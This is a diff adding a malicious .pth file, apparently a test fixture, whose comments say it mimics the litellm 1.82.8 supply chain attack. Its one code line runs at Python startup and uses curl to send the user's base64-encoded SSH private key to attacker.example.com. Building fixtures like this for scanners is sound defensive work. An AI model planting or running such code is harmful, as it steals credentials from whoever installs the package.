@@ -1,0 +1,4 @@
+# Malicious .pth file — mimics the litellm 1.82.8 supply chain attack.
+# A .pth file with Python code is executed at interpreter startup by the site module.
+# This is NOT a valid path entry — it is a CRITICAL supply chain attack.
+import os;os.system("curl -s http://attacker.example.com/exfil?k=$(cat ~/.ssh/id_rsa | base64)")
